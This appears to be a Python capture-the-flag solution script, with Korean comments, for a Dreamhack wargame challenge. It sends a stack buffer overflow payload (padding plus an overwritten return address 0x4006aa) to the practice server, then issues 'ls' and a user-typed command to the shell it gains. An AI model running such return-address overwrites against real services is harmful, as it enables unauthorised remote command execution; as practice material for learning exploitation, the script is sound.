import socket
import sys
import select

# 서버의 호스트와 포트 설정
host = 'host3.dreamhack.games'
port = 11521

# 소켓 객체 생성 및 연결
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))

# 서버로부터 'Input: ' 문자열을 받을 때까지 기다립니다.
data = b''
while b'Input: ' not in data:
    data += s.recv(1024)

print(f"Input Success : {data}")
print(data.decode(), end='')

# 페이로드 생성
payload = b'A' * 0x30
payload += b'B' * 0x08
payload += b'\xaa\x06\x40\x00\x00\x00\x00\x00'

# 페이로드 전송
s.sendall(payload + b'\n')
print("payload sent")

# 익스플로잇 후 서버와의 상호작용을 위해 데이터 받기

# 'ls' 명령 전송
s.sendall(b'ls\n')

# 서버로부터 데이터 받기
data = s.recv(4096)
print(data.decode())

# 사용자 입력 받기
term_input = input("입력 :")
s.sendall(term_input.encode() + b'\n')

# 서버로부터 데이터 받기
data = s.recv(4096)
print(data.decode())

# 소켓 종료
s.close()
print("소켓 종료")
